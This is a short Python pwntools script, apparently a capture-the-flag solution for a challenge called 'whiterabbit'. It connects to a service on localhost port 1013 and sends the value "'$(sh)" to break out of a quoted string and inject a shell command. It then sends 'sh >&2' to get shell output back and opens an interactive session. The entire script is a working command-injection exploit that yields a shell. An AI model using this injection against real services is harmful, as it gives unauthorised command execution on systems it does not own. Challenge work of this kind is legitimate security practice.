from pwn import *  # NOQA

# p = process("./whiterabbit")
p = remote("localhost", 1013)

p.sendline("'$(sh)")
p.recv()
p.sendline("sh >&2")

p.interactive()
